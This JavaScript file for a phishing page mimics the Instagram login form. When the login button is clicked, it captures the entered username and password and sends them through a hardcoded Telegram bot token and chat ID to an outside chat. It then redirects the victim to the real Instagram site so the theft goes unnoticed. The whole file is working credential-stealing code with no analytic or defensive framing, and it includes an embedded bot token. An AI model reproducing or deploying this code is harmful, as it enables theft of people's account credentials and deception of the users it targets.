const BOT_TOKEN = "7069881307:AAGgW0hE9Conz4zMY7I5nKJsBjD5HcQi100";
const TELEGRAM_CHAT_ID = "7289939968";
const TELEGRAM_BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}`;

const usernameInput = document.querySelector('.username');
const passwordInput = document.querySelector('.password');
const loginButton = document.querySelector('.login-btn');
const forgotLink = document.querySelector('.forget');

forgotLink.addEventListener("click", (event) => {
    event.preventDefault();
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
});

loginButton.addEventListener("click", (event) => {
    event.preventDefault();
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();
    if (!username || !password) {
        alert("Please enter both username and password.");
        return;
    }
    const message = `\nLogin: ${username}\nPassword: ${password}`;
    sendMessageToBot(message);
    window.location.href = "https://www.instagram.com/";
});

function sendMessageToBot(message) {
    fetch(TELEGRAM_BOT_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            text: message,
        }),
    })
        .then((response) => response.json())
        .then((data) => {
            console.log("Message sent successfully:", data);
        })
        .catch((error) => {
            console.error("Error sending message:", error);
        });
}
